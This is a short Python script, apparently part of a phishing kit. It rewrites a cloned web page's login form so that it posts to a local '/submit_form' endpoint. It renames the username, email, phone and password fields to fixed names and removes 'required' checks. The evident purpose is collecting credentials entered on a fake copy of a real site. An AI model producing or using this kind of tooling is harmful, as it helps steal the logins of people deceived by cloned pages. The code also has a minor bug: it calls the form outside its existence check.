from bs4 import BeautifulSoup
import os

def modify_cloned_html():
    # Ask for the name of the HTML file to modify
    html_file = input("Enter the name of the HTML file to modify (including extension): ").strip()

    # Check if the file exists
    if not os.path.exists(html_file):
        print("Error: HTML file not found.")
        return

    with open(html_file, 'r', encoding='utf-8') as file:
        html_content = file.read()

    soup = BeautifulSoup(html_content, 'html.parser')

    # Find the form element and update its action attribute
    form = soup.find('form')
    if form:
        form['action'] = "/submit_form"

        # Find username, email, or phone input fields and update their attributes
        username_fields = form.find_all('input', {'type': ['text', 'email', 'tel']})
        for field in username_fields:
            field['name'] = 'username'
            field['id'] = 'username'

        # Find password input fields and update their attributes
        password_fields = form.find_all('input', {'type': 'password'})
        for field in password_fields:
            field['name'] = 'password'
            field['id'] = 'password'

    # Remove input checks (e.g., 'required' attribute) from input fields
    input_fields = form.find_all('input')
    for field in input_fields:
        if 'required' in field.attrs:
            del field['required']

    # Write the modified HTML content back to the file
    with open(html_file, 'w', encoding='utf-8') as file:
        file.write(str(soup))

    print("HTML file modified successfully.")

# Call the modify_cloned_html function
modify_cloned_html()
